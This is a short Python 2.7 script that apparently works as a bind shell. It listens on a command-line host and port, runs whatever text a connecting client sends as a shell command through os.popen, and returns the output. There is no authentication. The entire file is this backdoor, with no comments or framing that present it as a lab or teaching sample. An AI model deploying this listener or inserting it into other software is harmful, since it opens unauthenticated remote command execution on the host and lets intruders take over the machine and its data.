#!/usr/bin/python2.7

import socket
import os
import sys

host = sys.argv[1] #localhost
port = sys.argv[2] # 2000

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((host, int(port)))
sock.listen(100)

while True:
	client, address = sock.accept()

	while True:
		command = client.recv(1000)
		result = os.popen(command).read()
		client.send(result)